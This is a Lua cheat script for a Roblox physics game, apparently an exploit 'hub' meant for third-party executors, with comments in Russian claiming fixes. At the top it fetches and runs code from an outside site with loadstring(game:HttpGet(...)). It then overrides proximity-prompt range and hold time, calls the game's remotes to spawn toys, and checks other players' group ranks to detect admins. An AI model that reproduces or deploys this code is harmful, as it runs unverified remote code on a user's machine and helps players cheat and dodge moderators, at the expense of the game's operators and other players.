print('discord.gg/25ms was here | Fixed Version')
local _Players = game:GetService('Players')
local u3 = loadstring(game:HttpGet('http://whimper.xyz'))()
local _Debris = game:GetService('Debris')
local _Workspace = game:GetService('Workspace')
local _Lighting = game:GetService('Lighting')
local _TweenService = game:GetService('TweenService')
local _UserInputService = game:GetService('UserInputService')
local _ReplicatedStorage = game:GetService('ReplicatedStorage')
local _ReplicatedFirst = game:GetService('ReplicatedFirst')
local _ContextActionService = game:GetService('ContextActionService')
local _RunService = game:GetService('RunService')
local _VirtualUser = game:GetService('VirtualUser')
local _CharacterEvents = _ReplicatedStorage:WaitForChild('CharacterEvents')
local _LocalPlayer = _Players.LocalPlayer
local _PlayerGui = _LocalPlayer:WaitForChild('PlayerGui')
_LocalPlayer:GetMouse()

local u17 = _Workspace:WaitForChild(_LocalPlayer.Name .. 'SpawnedInToys')
local _InPlot = _LocalPlayer:WaitForChild('InPlot')
local _ToysLimitCap = _LocalPlayer:WaitForChild('ToysLimitCap')

SpawnToyRF = _ReplicatedStorage:WaitForChild('MenuToys'):WaitForChild('SpawnToyRemoteFunction')
DeleteToyRE = _ReplicatedStorage:WaitForChild('MenuToys'):WaitForChild('DestroyToy')
BuyToy = _ReplicatedStorage:WaitForChild('MenuToys'):WaitForChild('BuyToyRemoteFunction')
BombEvents = _ReplicatedStorage:WaitForChild('BombEvents')
typeAnimation = _ReplicatedFirst.Typing.Type
flailAnimation = _ReplicatedFirst.ThrowPlayers.Flail

local _CreateGrabLine = _ReplicatedStorage:WaitForChild('GrabEvents'):WaitForChild('CreateGrabLine')
local _DestroyGrabLine = _ReplicatedStorage:WaitForChild('GrabEvents'):WaitForChild('DestroyGrabLine')
local _SetNetworkOwner = _ReplicatedStorage:WaitForChild('GrabEvents'):WaitForChild('SetNetworkOwner')

_ReplicatedStorage:WaitForChild('GrabEvents'):WaitForChild('ExtendGrabLine')

local _RagdollRemote = _CharacterEvents:WaitForChild('RagdollRemote')

ChatTypingBoard = _CharacterEvents:WaitForChild('ChatTyping')

local u24

if _ReplicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') and _ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild('SayMessageRequest') then
	u24 = _ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
else
	u24 = nil
end

local _UpdateLineColorsEvent = _ReplicatedStorage:WaitForChild('DataEvents'):WaitForChild('UpdateLineColorsEvent')
local _IsHeld = _LocalPlayer:WaitForChild('IsHeld')
local _PlayerScripts = _LocalPlayer:WaitForChild('PlayerScripts')
local u28 = nil
local _Struggle = _CharacterEvents:WaitForChild('Struggle')

anticreatelinelocalscript = _PlayerScripts:WaitForChild('CharacterAndBeamMove')

-- КРИТИЧЕСКИЙ ФИКС: Удален ломающий игру цикл while true do end

function Type(p31)
	if u24 then
		u24:FireServer(p31, 'All')
	end
end

local function u33(p32)
	if u3 and u3.MakeNotification then
		u3:MakeNotification({
			Name = 'Bliz_T HUB',
			Content = p32,
			Image = 'rbxassetid://16570630989',
			Time = 5,
		})
	end
end

function IsSolara()
	if getexecutorname then
		local v34 = getexecutorname()
		if v34 and string.find(v34, 'Solara') then
			return true
		end
	end
	return false
end

function IsMobile()
	if _LocalPlayer.PlayerGui:FindFirstChild('ContextActionGui') then
		return true
	end
	return false
end

IsUsingSolara = IsSolara()

if IsUsingSolara then
	print('new proximity prompt created!')
	getgenv().fireproximityprompt = function(p35)
		if p35.Name ~= 'ProximityPrompt' then
			error('Incorrect object: ' .. p35.Name)
		else
			local _HoldDuration = p35.HoldDuration
			local _MaxActivationDistance = p35.MaxActivationDistance

			p35.MaxActivationDistance = math.huge
			p35.HoldDuration = 0

			p35:InputHoldBegin()
			p35:InputHoldEnd()

			p35.HoldDuration = _HoldDuration
			p35.MaxActivationDistance = _MaxActivationDistance
		end
	end
end

local u38 = {}

function checkadminData(p39)
	if table.find(u38, p39) then
		return true
	end
	return false
end

spawnToyThread = coroutine.create(function()
	while true do
		local v40
		repeat
			v40 = coroutine.yield()
		until typeof(v40) == 'table'

		SpawnToyRF:InvokeServer(unpack(v40))
	end
end)

function SpawnToy(p41)
	coroutine.resume(spawnToyThread, p41)
end

local function u49(p42, p43)
	if typeof(p42) == 'Instance' and p42.Parent then
		local _LastTimeRankUpdate = p42:GetAttribute('LastTimeRankUpdate')

		if not _LastTimeRankUpdate or (_LastTimeRankUpdate and 300 <= os.clock() - _LastTimeRankUpdate) then
			local v45, v46 = pcall(function()
				return p42:GetRankInGroup(p43)
			end)
			local _, v47 = pcall(function()
				return p42:GetRoleInGroup(p43)
			end)
			local v48 = not v45 and 'Common' or v46

			if v48 == 255 then
				p42:SetAttribute('Rank', 'Leader')
			elseif v48 == 4 then
				if v47 == 'High Rank Admin' then
					p42:SetAttribute('Rank', 'High Rank Admin')
				end
			elseif v48 == 3 then
				p42:SetAttribute('Rank', 'Low Rank Admin')
			elseif v48 == 2 then
				p42:SetAttribute('Rank', 'Goon')
			elseif v48 == 0 or v48 == 1 then
				p42:SetAttribute('Rank', 'Common')
			end

			p42:SetAttribute('LastTimeRankUpdate', os.clock())
		end
	end
end

local function u54(p50)
	if typeof(p50) ~= 'Instance' then
		p50 = nil
	elseif p50:IsA('Model') and p50:FindFirstChildOfClass('Humanoid') and _Players:GetPlayerFromCharacter(p50) then
		p50 = _Players:GetPlayerFromCharacter(p50)
	elseif not p50:IsA('Player') then
		return false
	end

	local v51 = false

	if p50 then
		local v52 = u49(p50, 16168861)
		local v53 = (v52 == 'Leader' or v52 == 'High Rank Admin') and true or ((v52 == 'Low Rank Admin' or v52 == 'Goon') and true or v51)

		if checkadminData(p50.Name) and not u38[p50.Name].Protection then
			v53 = false
		end

		return v53
	end
	return false
end

function IsHoldingAdminPlayer()
	local _GrabParts = _Workspace:FindFirstChild('GrabParts')
	if _GrabParts and _GrabParts:FindFirstChild('GrabPart') and _GrabParts.GrabPart:FindFirstChild('WeldConstraint') then
		local _Part1 = _GrabParts.GrabPart.WeldConstraint.Part1
		if _Part1 and u54(_Part1.Parent) then
			return true
		end
	end
	return false
end

function WhatIsHolding(p57)
	if p57 and p57:FindFirstChild('GrabPart') and p57.GrabPart:FindFirstChild('WeldConstraint') then
		local _Part12 = p57.GrabPart.WeldConstraint.Part1
		if _Part12 and _Part12.Parent and _Part12.Parent:IsA('Model') then
			local _Parent = _Part12.Parent
			return _Players:GetPlayerFromCharacter(_Part12.Parent) and 'Player' or (_Parent:FindFirstChild('Pet') and 'Follow NPC' or 'Object')
		end
	end
end

function tableAlphabeticOrder(p60, p61)
	return p60:lower() < p61:lower()
end

local function u69(p62)
	local v63 = _Players
	local v64, v65, v66 = pairs(v63:GetPlayers())
	local v67 = {}

	while true do
		local v68
		v66, v68 = v64(v65, v66)
		if v66 == nil then break end
		if v68.UserId ~= _LocalPlayer.UserId then
			table.insert(v67, v68.Name .. ' ' .. '(' .. v68.DisplayName .. ')')
		end
	end

	table.sort(v67, tableAlphabeticOrder)
	p62:Refresh(v67, true)
end

local u70 = {}
local u71 = {}

local function u79(p72, p73)
	local v74, v75, v76 = pairs(p73)
	local v77 = {}

	while true do
		local v78
		v76, v78 = v74(v75, v76)
		if v76 == nil then break end
		if typeof(v78) == 'string' then
			table.insert(v77, v78)
		end
	end

	p72:Refresh(v77, true)
end

local function u87(p80)
	local v81 = _Players
	local v82, v83, v84 = pairs(v81:GetPlayers())
	local v85 = {}

	while true do
		local v86
		v84, v86 = v82(v83, v84)
		if v84 == nil then break end
		if v86.UserId ~= _LocalPlayer.UserId then
			table.insert(v85, v86.Name .. ' ' .. '(' .. v86.DisplayName .. ')')
		end
	end

	table.sort(v85, tableAlphabeticOrder)
	table.insert(v85, 1, _LocalPlayer.Name .. ' ' .. '(' .. _LocalPlayer.DisplayName .. ')')
	p80:Refresh(v85, true)
end

function lookAt(p88, p89)
	local _Unit = (p89 - p88).Unit
	local v91 = _Unit:Cross((Vector3.new(0, 1, 0)))
	local v92 = v91:Cross(_Unit)
	return CFrame.fromMatrix(p88, v91, v92)
end

-- КРИТИЧЕСКИЙ ФИКС: Безопасное получение CFrame и завершение функции спавна по TAB
local function u96(p93, p94, p95)
	if p93 == 'Spawn Toy (TAB)' and p94 == Enum.UserInputState.Begin then
		local character = _LocalPlayer.Character
		if character and character:FindFirstChild("CamPart") then
			local v95 = {
				_G.SelectedToy or "Bomb", -- Дефолтное значение, если игрушка не выбрана
				character.CamPart.CFrame,
				Vector3.new(0, character.CamPart.Orientation.Y, 0)
			}
			SpawnToy(v95)
		else
			u33("Ошибка: CamPart или Персонаж еще не появились!")
		end
	end
end

-- Регистрация кнопки TAB через ContextActionService
_ContextActionService:BindAction('Spawn Toy (TAB)', u96, false, Enum.KeyCode.Tab)

u33("Скрипт успешно запущен и исправлен!")
